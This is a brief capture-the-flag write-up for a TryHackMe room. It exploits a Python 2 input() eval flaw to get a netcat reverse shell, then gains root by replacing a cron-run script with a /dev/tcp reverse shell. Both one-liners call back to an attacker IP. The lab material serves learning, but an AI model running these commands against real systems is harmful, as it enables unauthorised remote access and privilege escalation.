Resourcs : [[https://tryhackme.com/room/bsidesgtdevelpy]]
Aim : get user.txt and root.txt .

**-->Nmap_scan**
![[nmap.png]]

Since only two ports are open, this hints that we would get some ssh credentials from port 10000 to 
use it for ssh .

So alanysing port 10000,
![[Pasted image 20220627193927.png]]
this shows that on connecting to it , it executes some python file.
So , let's connect:

**-->Nc**
![[Pasted image 20220627193724.png]]
u enter any number it will accept, but the interesting this is that it also accepts eval(2 * 2) . This type of flaw was found in python2 input() finction.
On googling it i found a website [[https://intx0x80.blogspot.com/2017/05/python-input-vulnerability_25.html]]
![[Pasted image 20220627194714.png]]
So, i just needed to to put commands to gain a reverse shell under the system parameters.
enter the codes  below to get a rev shell.
`__import__("os").system("nc -e /bin/sh 10.8.82.127 6969")`

**-->SHELLS**
![[Pasted image 20220627195740.png]]
stabilising the shell with 
`python -c 'import pty; pty.spawn("/bin/bash")'`
![[Pasted image 20220627203345.png]]
-->file contents :
![[Pasted image 20220627204024.png]]
On exploring we see that in crontab the root runs root.sh file in king's directory.
On going one directory we see that the home directory is owned by the user 'king' .
Hence we would delete the root.sh file and make one of our own (as write permission is not there in present one)
![[Pasted image 20220627203640.png]]
*simple* : executing the following commands
`ehco "sh -i >& /dev/tcp/10.8.82.127/ 5051 0>&1" >root.sh`
this creates a new root.sh
now wait for one minute.
![[Pasted image 20220627212159.png]]
GREAT we got the root shell after one minute.
That's all for this challenge !!


